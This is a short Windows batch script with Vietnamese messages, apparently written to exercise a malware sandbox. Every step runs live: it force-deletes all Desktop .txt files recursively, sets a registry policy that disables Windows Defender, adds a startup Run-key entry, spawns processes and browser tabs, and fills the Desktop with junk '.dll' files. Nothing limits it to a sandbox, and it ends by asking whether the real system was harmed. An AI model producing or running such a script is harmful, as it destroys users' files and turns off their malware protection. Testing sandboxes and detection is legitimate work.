@echo off
color 0A
title --- EXTREME MALWARE TEST FOR SANDBOX ---
echo ===================================================
echo   CANH BAO: DANG THUC THI SCRIPT THU NGHIEM DOC HAI
echo ===================================================
echo.
echo [1/4] Dang gia lap Ransomware: Xoa tat ca file txt tren Desktop...
del /f /q /s "%USERPROFILE%\Desktop\*.txt" >nul 2>&1

echo [2/4] Dang ghi de Registry (Tat Defender & Chen Startup)...
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v VirusTest /t REG_SZ /d "C:\fake_virus.exe" /f >nul 2>&1

echo [3/4] Dang spam mo hang loạt ung dung va tab trinh duyet...
start notepad.exe
start cmd.exe /k "echo DANG SPAM PROCESS IN SANDBOX..."
start https://www.google.com
start https://www.bing.com

echo [4/4] Dang tao file rac chiem dung dung luong o C...
cd /d "%USERPROFILE%\Desktop"
for /l %%i in (1,1,50) do (
    echo PHALAY_VIRUS_DATA_%%i > "MALWARE_PAYLOAD_%%i.dll"
)

echo.
echo ===================================================
echo HOAN TAT TOAN BO CAC HANH VI PHA HOAI!
echo Kiem tra xem may parliament/he thong thật co bi anh huong khong.
echo ===================================================
pause